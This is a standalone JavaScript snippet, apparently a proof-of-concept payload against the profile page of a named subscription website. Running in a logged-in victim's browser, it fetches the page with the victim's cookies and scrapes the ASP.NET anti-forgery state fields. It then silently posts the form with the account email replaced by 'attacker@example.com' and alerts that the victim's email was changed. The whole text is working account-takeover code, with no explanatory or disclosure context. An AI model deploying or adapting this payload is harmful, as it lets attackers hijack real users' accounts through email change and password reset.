fetch("https://www.profound.com/Pages/Subscriptions/ProfileManagement.aspx?view=Profile", {
  credentials: "include"
})
.then(response => response.text())
.then(html => {
    let parser = new DOMParser();
    let doc = parser.parseFromString(html, "text/html");

    let currentEmail = doc.querySelector("#BodyArea_MainContentArea_radEmailAddress_text")?.value;
    let currentPhone = doc.querySelector("#BodyArea_MainContentArea_radPhone_text")?.value;

    let viewstate = html.match(/id="__VIEWSTATE" value="([^"]+)"/)?.[1];
    let previousPage = html.match(/id="__PREVIOUSPAGE" value="([^"]+)"/)?.[1];
    let eventValidation = html.match(/id="__EVENTVALIDATION" value="([^"]+)"/)?.[1];

    let newEmail = "attacker@example.com";

    let params = new URLSearchParams();
    params.append("__VIEWSTATE", viewstate);
    params.append("__PREVIOUSPAGE", previousPage);
    params.append("__EVENTVALIDATION", eventValidation);
    params.append("__EVENTTARGET", "");
    params.append("__EVENTARGUMENT", "");
    params.append("BodyArea_MainContentArea_radEmailAddress_text", newEmail);
    params.append("ctl00$ctl00$BodyArea$MainContentArea$radEmailAddress", newEmail);
    params.append("BodyArea_MainContentArea_radEmailAddress_ClientState", "");

    params.append("BodyArea_MainContentArea_radPhone_text", currentPhone);
    params.append("ctl00$ctl00$BodyArea$MainContentArea$radPhone", currentPhone);
    params.append("BodyArea_MainContentArea_radPhone_ClientState", "");

    params.append("ctl00$ctl00$BodyArea$MainContentArea$btnSave", "Save changes");

    fetch("https://www.profound.com/Pages/Subscriptions/ProfileManagement.aspx?view=Profile", {
        method: "POST",
        credentials: "include",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: params.toString()
    }).then(res => {
        if (res.ok) {
            alert("✅ Victim's email updated to: " + newEmail);
        } else {
            alert("❌ Failed to update email.");
        }
    });
});
